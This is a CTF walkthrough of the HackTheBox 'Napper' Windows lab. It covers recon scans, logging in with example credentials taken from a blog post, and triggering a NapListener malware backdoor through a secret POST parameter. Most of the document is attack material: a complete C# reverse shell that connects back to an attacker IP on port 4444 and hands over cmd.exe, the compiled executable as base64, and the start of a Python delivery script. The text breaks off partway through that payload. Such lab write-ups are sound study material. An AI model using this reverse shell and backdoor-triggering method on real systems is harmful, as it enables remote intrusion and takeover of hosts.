# HackTheBox Napper

A Hard level CTF lab machine of the HackTheBox platform running on Windows OS, where we exploit a Naplistener malware sample launched by a virus analyst and then escalate privileges by exploiting our own password rotation solution.

## Service Overview

The machine is assigned IP address 10.10.11.240, let's run a port scan with rustscan:

```bash
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.240 -- -A -sC

PORT     STATE SERVICE    REASON          VERSION
80/tcp   open  http       syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp  open  ssl/http   syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_ssl-date: 2023-11-15T08:29:00+00:00; 0s from scanner time.
|_http-title: Research Blog | Home
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US/localityName=San Fransisco/organizationalUnitName=MlopsHub Dev
| Subject Alternative Name: DNS:app.napper.htb
| Issuer: commonName=ca.napper.htb/countryName=US/localityName=San Fransisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-07T14:58:55
| Not valid after:  2033-06-04T14:58:55
| MD5:   ee1adff89a6f5ddd1add9d22040858dc
| SHA-1: f134fe3831f50c749a26d44163a8232da67a782b
| -----BEGIN CERTIFICATE-----
| MIIDzTCCArWgAwIBAgIJALM7fwOVfMaCMA0GCSqGSIb3DQEBCwUAMD0xFjAUBgNV
| BAMMDWNhLm5hcHBlci5odGIxCzAJBgNVBAYTAlVTMRYwFAYDVQQHDA1TYW4gRnJh
| bnNpc2NvMB4XDTIzMDYwNzE0NTg1NVoXDTMzMDYwNDE0NTg1NVowfTELMAkGA1UE
| BhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExFjAUBgNVBAcMDVNhbiBGcmFuc2lz
| Y28xETAPBgNVBAoMCE1Mb3BzSHViMRUwEwYDVQQLDAxNbG9wc0h1YiBEZXYxFzAV
| BgNVBAMMDmFwcC5uYXBwZXIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
| CgKCAQEAqkM19E9lbE476qF6RBriuwNHdCgjwLybb9pXWIgtPen6hNCBvzp0XLlY
| ZWJ3NNszYH7Z6pgDJHCDIrSZXtkAEHh7AdoN7ZFLWScHwz/qWesBjH2DYHfBABkm
| qorv3dS6MqpZXJK81e1bQdS9IlRiPmJTYHX17+vfd7FBP2XaARtpgDIkDEPyPIIe
| GfTbtk3/E3N/EjZX7lR7lgAMhZmpEpmb7AoQ1btPraFwH/PXG5r020vfC+fCzgAK
| X3BmCfSzUI2AXz/2GJrRsSSdjKTCLJgn5Cau9bI+IO9pH3HOkfXDiWLB4ip++dGK
| hxYMEc5xwrcF3ZsE6s42cisD8pNipwIDAQABo4GPMIGMMFcGA1UdIwRQME6hQaQ/
| MD0xFjAUBgNVBAMMDWNhLm5hcHBlci5odGIxCzAJBgNVBAYTAlVTMRYwFAYDVQQH
| DA1TYW4gRnJhbnNpc2NvggkA4xs9TVmYevYwCQYDVR0TBAIwADALBgNVHQ8EBAMC
| BPAwGQYDVR0RBBIwEIIOYXBwLm5hcHBlci5odGIwDQYJKoZIhvcNAQELBQADggEB
| ABuy5lV920FJXR4j0dWSAqpEPCXj3jVc7vbozP24sFAocNCzodYiuKV10NyhXxJ+
| rxgu5HgmWk47yaz17eYwMDWYnfoIGRVMl4IkSve/9wr1+ReiywIPGyCG/GCxk3KI
| OG/IyX9j8KR7bhTnlMPixVVqkAu0E2CwZ8I0WmjBdQzEs4wBmpmRO5Eqodxf/jkM
| 3a7CU0Q3m9+SKwOnvarn0Wp++UmlD4/y+O8+j9+URXtD7RElZfrcv9wknVGD7H0s
| U98Kn5WCVanMjGtaQmBjCNdTX/6rif90qiTgyw3mGw8IyatfXAwF75jkvB4vTAHk
| ziVXyfoozsWvOoF8/YiMKsI=
|_-----END CERTIFICATE-----
|_http-generator: Hugo 0.112.3
7680/tcp open  pando-pub? syn-ack ttl 127
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)

```

Let's immediately add all found domain names to /etc/hosts:

```bash
$ sudo nano /etc/hosts
10.10.11.240 app.napper.htb ca.napper.htb napper.htb
```

[The blog](app.napper.htb) was created using Hugo - these are static files.

Let's start gobuster to look for other domains:

```bash
$ gobuster vhost -u https://napper.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://napper.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/11/15 10:42:46 Starting gobuster in VHOST enumeration mode
===============================================================
Found: internal.napper.htb (Status: 401) [Size: 1293]
```

Let's add the found domain to /etc/hosts.

On the internal.napper.htb portal we are greeted by Basic Auth.

Find the blog article https://app.napper.htb/posts/setup-basic-auth-powershell/, where we see an example command to add a new user: ```example:ExamplePassword```. 
We enter these creds and enter the internal portal.

In the article https://internal.napper.htb/posts/first-re-research/ we find links to the malwari study, as well as links to other references:

- https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph
- https://malpedia.caad.fkie.fraunhofer.de/details/win.naplistener
- https://www.darkreading.com/threat-intelligence/custom-naplistener-malware-network-based-detection-sleep

From the text of the article we understand that the researcher ran the malware on a local machine outside the sandbox.

## Naplistener

The hash of the file from the links above is 6e8c5bb2dfc90bca380c6f42af7458c8b8af40b7be95fab91e7c67b0dee664c4.

If we submit a blank form, we get a 404:

```bash
curl -v -v -k --request POST -d "" https://napper.htb/ews/MsExgHealthCheckd/

Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.240:443...
* Connected to napper.htb (10.10.11.240) port 443 (#0)
* ALPN: offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN: server accepted h2
* Server certificate:
*  subject: C=US; ST=California; L=San Fransisco; O=MLopsHub; OU=MlopsHub Dev; CN=app.napper.htb
*  start date: Jun  7 14:58:55 2023 GMT
*  expire date: Jun  4 14:58:55 2033 GMT
*  issuer: CN=ca.napper.htb; C=US; L=San Fransisco
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* using HTTP/2
* h2h3 [:method: POST]
* h2h3 [:path: /ews/MsExgHealthCheckd/]
* h2h3 [:scheme: https]
* h2h3 [:authority: napper.htb]
* h2h3 [user-agent: curl/7.88.1]
* h2h3 [accept: */*]
* h2h3 [content-length: 0]
* h2h3 [content-type: application/x-www-form-urlencoded]
* Using Stream ID: 1 (easy handle 0x5654813871f0)
> POST /ews/MsExgHealthCheckd/ HTTP/2
> Host: napper.htb
> user-agent: curl/7.88.1
> accept: */*
> content-length: 0
> content-type: application/x-www-form-urlencoded
>
< HTTP/2 404
< content-length: 0
< content-type: text/html; charset=utf-8
< server: Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0
< x-powered-by: ASP.NET
< date: Wed, 15 Nov 2023 10:17:05 GMT
<
* Connection #0 to host napper.htb left intact
```

If you throw the sdafwe3rwe23 parameter, the server responds with code 200:

```bash
curl -v -k --request POST -d "sdafwe3rwe23=test" https://napper.htb/ews/MsExgHealthCheckd/
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.240:443...
* Connected to napper.htb (10.10.11.240) port 443 (#0)
* ALPN: offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN: server accepted h2
* Server certificate:
*  subject: C=US; ST=California; L=San Fransisco; O=MLopsHub; OU=MlopsHub Dev; CN=app.napper.htb
*  start date: Jun  7 14:58:55 2023 GMT
*  expire date: Jun  4 14:58:55 2033 GMT
*  issuer: CN=ca.napper.htb; C=US; L=San Fransisco
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* using HTTP/2
* h2h3 [:method: POST]
* h2h3 [:path: /ews/MsExgHealthCheckd/]
* h2h3 [:scheme: https]
* h2h3 [:authority: napper.htb]
* h2h3 [user-agent: curl/7.88.1]
* h2h3 [accept: */*]
* h2h3 [content-length: 17]
* h2h3 [content-type: application/x-www-form-urlencoded]
* Using Stream ID: 1 (easy handle 0x561e372121f0)
> POST /ews/MsExgHealthCheckd/ HTTP/2
> Host: napper.htb
> user-agent: curl/7.88.1
> accept: */*
> content-length: 17
> content-type: application/x-www-form-urlencoded
>
* We are completely uploaded and fine
< HTTP/2 200
< content-length: 0
< content-type: text/html; charset=utf-8
< server: Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0
< x-powered-by: ASP.NET
< date: Wed, 15 Nov 2023 10:18:01 GMT
<
* Connection #0 to host napper.htb left intact
```

Take any [reverse-shell](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc) and rewrite it to reflect that we need to create a Run class.

```cs
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace messagebox
{
  internal class Program
  {
    static StreamWriter streamWriter;

    public static void BackConnect(string ip, int port)
    {
        using (TcpClient client = new TcpClient(ip, port))
        {
            using (Stream stream = client.GetStream())
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    streamWriter = new StreamWriter(stream);

                    StringBuilder strInput = new StringBuilder();

                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                    p.Start();
                    p.BeginOutputReadLine();

                    while (true)
                    {
                        strInput.Append(rdr.ReadLine());
                        p.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                }
            }
        }
    }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();

        if (!string.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception) { }
        }
    }

    static void Main()
    {
        new Run();
    }
  }

  public class Run
  {
    public Run()
    {
        Program.BackConnect("10.10.16.5", 4444);
    }
  }
}
```

Compile and get base64 representation:

```bash
$ sudo apt install mono-complete
$ mcs -out:messagebox.exe messagebox.cs
$ cat messagebox.exe | base64 -w 0

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bS5OZXQuU29ja2V0cwAuY3RvcgBTdHJlYW0AR2V0U3RyZWFtAE5ldHdvcmtTdHJlYW0AU3RyZWFtUmVhZGVyAFN0cmluZ0J1aWxkZXIAU3lzdGVtLlRleHQAUHJvY2VzcwBTeXN0ZW0uRGlhZ25vc3RpY3MAZ2V0X1N0YXJ0SW5mbwBQcm9jZXNzU3RhcnRJbmZvAHNldF9GaWxlTmFtZQBzZXRfQ3JlYXRlTm9XaW5kb3cAc2V0X1VzZVNoZWxsRXhlY3V0ZQBzZXRfUmVkaXJlY3RTdGFuZGFyZE91dHB1dABzZXRfUmVkaXJlY3RTdGFuZGFyZElucHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IARGF0YVJlY2VpdmVkRXZlbnRIYW5kbGVyAGFkZF9PdXRwdXREYXRhUmVjZWl2ZWQAU3RhcnQAQmVnaW5PdXRwdXRSZWFkTGluZQBUZXh0UmVhZGVyAFJlYWRMaW5lAEFwcGVuZABnZXRfU3RhbmRhcmRJbnB1dABUZXh0V3JpdGVyAFdyaXRlTGluZQBnZXRfTGVuZ3RoAFJlbW92ZQBJRGlzcG9zYWJsZQBTeXN0ZW0ARGlzcG9zZQBzZW5kaW5nUHJvY2VzcwBvdXRMaW5lAERhdGFSZWNlaXZlZEV2ZW50QXJncwBnZXRfRGF0YQBTdHJpbmcASXNOdWxsT3JFbXB0eQBGbHVzaABFeGNlcHRpb24AT2JqZWN0AEJhY2tDb25uZWN0AENtZE91dHB1dERhdGFIYW5kbGVyAE1haW4AUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBtc2NvcmxpYgBtZXNzYWdlYm94LmV4ZQAAAAAPYwBtAGQALgBlAHgAZQAAFTEAMAAuADEAMAAuADEANgAuADUAAAA9dNODkBrqQbnMAnUjPExjAAMGEgUFIAIBDggEIAASEQUgAQESDQMgAAEEIAASIQQgAQEOBCABAQIFIAIBHBgFIAEBEiUDIAACAyAADgUgARIZDgQgABIFBCABARwDIAAIBiACEhkICAQAAQIOBQACAQ4IDAcFEgkSDRIVEhkSHQYAAgEcEjUEBwESGQMAAAEeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCLd6XFYZNOCJAAAAAAAAAADIKAAAAAAAAAAAAADeKAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0CgAAAAAAAAAAF9Db3JFeGVNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAJgCAAAAAAAAAAAAAJgCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAH8AsAT4AQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAADUAQAAAQAwADAANwBmADAANABiADAAAAAcAAIAAQBDAG8AbQBtAGUAbgB0AHMAAAAgAAAAJAACAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAgAAAALAACAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADAALgAwAC4AMAAuADAAAAA4AAsAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAG0AZQBzAHMAYQBnAGUAYgBvAHgAAAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAAAsAAIAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAIAAAAEgADwABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABtAGUAcwBzAGEAZwBlAGIAbwB4AC4AZQB4AGUAAAAAACQAAgABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAIAAAACgAAgABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA8DgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Paste it into the payload in the script:

```python
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


hosts = ["napper.htb"]
payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAgELAQgAAAoAAAAGAAAAAAAA7igAAAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAKAoAABLAAAAAEAAAPACAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA9AgAAAAgAAAACgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAPACAAAAQAAAAAQAAAAMAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADQKAAAAAAAAEgAAAACAAUABCIAAJQGAAABAAAABAAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4CKBwAAAoqGzADAPYAAAABAAARAgNzAQAACgoGbwIAAAoLB3MDAAAKDAdzBAAACoABAAAEcwUAAAoNcwYAAAoTBBEEbwcAAApyAQAAcG8IAAAKEQRvBwAAChdvCQAAChEEbwcAAAoWbwoAAAoRBG8HAAAKF28LAAAKEQRvBwAAChdvDAAAChEEbwcAAAoXbw0AAAoRBBT+BgMAAAZzDgAACm8PAAAKEQRvEAAACiYRBG8RAAAKCQhvEgAACm8TAAAKJhEEbxQAAAoJbxUAAAoJFglvFgAACm8XAAAKJjjT////CDkGAAAACG8YAAAK3Ac5BgAAAAdvGAAACtwGOQYAAAAGbxgAAArcAAABKAAAAgAWALnPAA0AAAAAAgAPAM3cAA0AAAAAAgAIAOHpAA0AAAAAGzACAEQAAAACAAARcwUAAAoKA28ZAAAKKBoAAAo6LQAAAAYDbxkAAApvEwAACiZ+AQAABAZvFQAACn4BAAAEbxsAAArdBgAAACbdAAAAACoBEAAAAAAWACc9AAYPAAABHnMFAAAGJipaAigcAAAKchEAAHAgXBEAACgCAAAGKgBCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAAA8AgAAI34AAKgCAAAMAwAAI1N0cmluZ3MAAAAAtAUAACgAAAAjVVMA3AUAABAAAAAjR1VJRAAAAOwFAACoAAAAI0Jsb2IAAAAAAAAAAgAAEFcVAgAJAAAAAPoBMwAWAAABAAAAEQAAAAMAAAABAAAABQAAAAQAAAAdAAAAAQAAAAIAAAABAAAAAgAAAAAA+wIBAAAAAAAGAC4AOwAKAE0AVwAGAHAAOwAKAIEAVwAGAI8AOwAGAJwAqgAKALYAvgAKAN8AvgAKAHMBvgAGAL0BOwAGAOoBOwAGABECHQIKAEMCvgAGAGICHQIGAH0CHQIGAIcCHQIGALQC0gIAAAAAAQAAAAAAAQABAAAAEAAVAAoAQQABAAEAAQAQAB0ACgBBAAIABQARACEAAQBQIAAAAACGGGoAFgABAFggAAAAAJYAjgJdAAEAhCEAAAAAkQCaAnAAAwDkIQAAAACRAK8CfAAFAOwhAAAAAIYYagAWAAUAAAABAEUAAAACAEgAAAABACwCAAACADsCEQBqAAUAEQB3AAsAKQBqABAACQBqABAAMQBqABYAOQBqABYAOQDRABoAQQDwAB8AQQD9ACQAQQAQASQAQQAkASQAQQA/ASQAQQBZASQASQBqACkAOQCMAS8AOQCjATUAOQCpARYAUQDIATkAMQDRAT0AOQDYAUMAWQD1AUgAMQD/AU0AMQAKAlEAYQAkAhYAaQBZAjkAcQBpAlgAWQB3AhYAgQBqABYAiQBqABYALgDrAIAAYwB3AASAAAAAAAAAAAAAAAAAAAAAAAoAAAAEAAAAAAAAAAAAAACfAPICAAAAAAQAAAAAAAAAAAAAAJ8AHQIAAAAAAAAAAAA8TW9kdWxlPgBtZXNzYWdlYm94AFByb2dyYW0AUnVuAHN0cmVhbVdyaXRlcgBTdHJlYW1Xcml0ZXIAU3lzdGVtLklPAGlwAHBvcnQAVGNwQ2xpZW50AFN5c3RlbS5OZXQuU29ja2V0cwAuY3RvcgBTdHJlYW0AR2V0U3RyZWFtAE5ldHdvcmtTdHJlYW0AU3RyZWFtUmVhZGVyAFN0cmluZ0J1aWxkZXIAU3lzdGVtLlRleHQAUHJvY2VzcwBTeXN0ZW0uRGlhZ25vc3RpY3MAZ2V0X1N0YXJ0SW5mbwBQcm9jZXNzU3RhcnRJbmZvAHNldF9GaWxlTmFtZQBzZXRfQ3JlYXRlTm9XaW5kb3cAc2V0X1VzZVNoZWxsRXhlY3V0ZQBzZXRfUmVkaXJlY3RTdGFuZGFyZE91dHB1dABzZXRfUmVkaXJlY3RTdGFuZGFyZElucHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IARGF0YVJlY2VpdmVkRXZlbnRIYW5kbGVyAGFkZF9PdXRwdXREYXRhUmVjZWl2ZWQAU3RhcnQAQmVnaW5PdXRwdXRSZWFkTGluZQBUZXh0UmVhZGVyAFJlYWRMaW5lAEFwcGVu